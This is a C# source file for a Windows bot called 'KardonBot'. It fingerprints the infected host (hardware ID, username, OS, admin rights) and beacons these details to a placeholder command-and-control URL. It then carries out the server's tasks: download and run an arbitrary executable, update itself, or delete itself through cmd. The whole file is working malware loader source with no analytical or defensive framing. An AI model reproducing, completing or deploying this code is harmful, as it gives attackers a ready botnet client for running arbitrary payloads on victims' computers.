using System;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Security.Cryptography;
using System.Diagnostics;
using System.IO;
using System.Threading.Tasks;


namespace KardonBot
{
    class Program
    {
        private static string C2_URL = "___C2_URL___"; // Placeholder for C2 URL
        private static string MUTEX = "___MUTEX___"; // Placeholder for mutex
        private static Random rand = new Random();
        private static string logPath = @"C:\Temp\kardon_log.txt";
        private static HttpClient httpClient = new HttpClient();

        static async Task Main(string[] args)
        {
            Directory.CreateDirectory(Path.GetDirectoryName(logPath));
            Log("Bot started on .NET 8.0");

            try
            {
                using (Mutex mutex = new Mutex(true, MUTEX, out bool createdNew))
                {
                    if (!createdNew) { Log("Mutex already exists, exiting"); Environment.Exit(0); }
                }
            }
            catch (Exception ex) { Log($"Mutex error: {ex.Message}"); }

            int delay = rand.Next(2000, 5000);
            Log($"Delaying for {delay}ms");
            Thread.Sleep(delay);

            string hwid = GetHWID();
            string username = Environment.UserName;
            string os = Environment.OSVersion.VersionString;
            string priv = IsAdmin() ? "Admin" : "User";
            string ver = "1.0";
            string av = "Unknown";
            string mark = "0";

            Log($"HWID: {hwid}, Username: {username}, OS: {os}, Priv: {priv}");

            while (true)
            {
                try
                {
                    Log($"Sending POST to {C2_URL}");
                    string postData = $"hwid={Uri.EscapeDataString(hwid)}&username={Uri.EscapeDataString(username)}&osversion={Uri.EscapeDataString(os)}&privileges={Uri.EscapeDataString(priv)}&version={Uri.EscapeDataString(ver)}&av={Uri.EscapeDataString(av)}&mark={Uri.EscapeDataString(mark)}&country=US";
                    var content = new StringContent(postData, Encoding.UTF8, "application/x-www-form-urlencoded");
                    HttpResponseMessage response = await httpClient.PostAsync(C2_URL, content);
                    string responseBody = await response.Content.ReadAsStringAsync();
                    Log($"Response: {responseBody}, Status: {response.StatusCode}");

                    if (!string.IsNullOrEmpty(responseBody))
                    {
                        if (responseBody == "notask")
                        {
                            Log("No tasks available");
                        }
                        else
                        {
                            string[] parts = responseBody.Split('|');
                            if (parts.Length >= 3)
                            {
                                string task = parts[0];
                                string param = parts[1];
                                string taskId = parts[2];
                                Log($"Task: {task}, Param: {param}, TaskID: {taskId}");

                                switch (task)
                                {
                                    case "1": // Download & Execute
                                        await DownloadAndExecute(param, taskId, hwid);
                                        break;
                                    case "2": // Update
                                        await UpdateBot(param, taskId, hwid);
                                        break;
                                    case "3": // Uninstall
                                        await UninstallBot(taskId, hwid);
                                        break;
                                    default:
                                        Log($"Unknown task: {task}");
                                        break;
                                }
                            }
                            else
                            {
                                Log("Invalid response format");
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    Log($"Error in main loop: {ex.Message}");
                }
                int pollDelay = rand.Next(30000, 60000);
                Log($"Sleeping for {pollDelay}ms");
                await Task.Delay(pollDelay);
            }
        }

        private static void Log(string message)
        {
            string logEntry = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] {message}\n";
            File.AppendAllText(logPath, logEntry);
            Console.WriteLine(logEntry);
        }

        private static string GetHWID()
        {
            using (MD5 md5 = MD5.Create())
            {
                byte[] input = Encoding.UTF8.GetBytes(Environment.MachineName + Environment.UserName);
                byte[] hash = md5.ComputeHash(input);
                return BitConverter.ToString(hash).Replace("-", "").ToLower();
            }
        }

        private static bool IsAdmin()
        {
            try
            {
                using (var identity = System.Security.Principal.WindowsIdentity.GetCurrent())
                {
                    var principal = new System.Security.Principal.WindowsPrincipal(identity);
                    return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
                }
            }
            catch { return false; }
        }

        private static async Task DownloadAndExecute(string url, string taskId, string hwid)
        {
            try
            {
                string tempPath = Path.GetTempPath() + Guid.NewGuid().ToString() + ".exe";
                Log($"Downloading from {url} to {tempPath}");
                byte[] fileBytes = await httpClient.GetByteArrayAsync(url);
                await File.WriteAllBytesAsync(tempPath, fileBytes);
                Process.Start(new ProcessStartInfo(tempPath) { UseShellExecute = true });
                var content = new StringContent($"taskid={taskId}&hwid={Uri.EscapeDataString(hwid)}&status=completed", Encoding.UTF8, "application/x-www-form-urlencoded");
                await httpClient.PostAsync(C2_URL, content);
                Log("Task 1 executed");
            }
            catch (Exception ex)
            {
                var content = new StringContent($"taskid={taskId}&hwid={Uri.EscapeDataString(hwid)}&status=failed", Encoding.UTF8, "application/x-www-form-urlencoded");
                await httpClient.PostAsync(C2_URL, content);
                Log($"Task 1 failed: {ex.Message}");
            }
        }

        private static async Task UpdateBot(string url, string taskId, string hwid)
        {
            try
            {
                string tempPath = Path.GetTempPath() + Guid.NewGuid().ToString() + ".exe";
                Log($"Updating from {url} to {tempPath}");
                byte[] fileBytes = await httpClient.GetByteArrayAsync(url);
                await File.WriteAllBytesAsync(tempPath, fileBytes);
                Process.Start(new ProcessStartInfo(tempPath) { UseShellExecute = true });
                var content = new StringContent($"taskid={taskId}&hwid={Uri.EscapeDataString(hwid)}&status=completed", Encoding.UTF8, "application/x-www-form-urlencoded");
                await httpClient.PostAsync(C2_URL, content);
                Log("Task 2 executed");
                Environment.Exit(0);
            }
            catch (Exception ex)
            {
                var content = new StringContent($"taskid={taskId}&hwid={Uri.EscapeDataString(hwid)}&status=failed", Encoding.UTF8, "application/x-www-form-urlencoded");
                await httpClient.PostAsync(C2_URL, content);
                Log($"Task 2 failed: {ex.Message}");
            }
        }

        private static async Task UninstallBot(string taskId, string hwid)
        {
            try
            {
                var content = new StringContent($"taskid={taskId}&hwid={Uri.EscapeDataString(hwid)}&status=completed", Encoding.UTF8, "application/x-www-form-urlencoded");
                await httpClient.PostAsync(C2_URL, content);
                string exePath = Process.GetCurrentProcess().MainModule.FileName;
                Log($"Uninstalling: {exePath}");
                Process.Start(new ProcessStartInfo("cmd.exe", $"/C timeout 2 & del \"{exePath}\"") { UseShellExecute = true });
                Log("Task 3 executed");
                Environment.Exit(0);
            }
            catch (Exception ex)
            {
                var content = new StringContent($"taskid={taskId}&hwid={Uri.EscapeDataString(hwid)}&status=failed", Encoding.UTF8, "application/x-www-form-urlencoded");
                await httpClient.PostAsync(C2_URL, content);
                Log($"Task 3 failed: {ex.Message}");
            }
        }
    }
}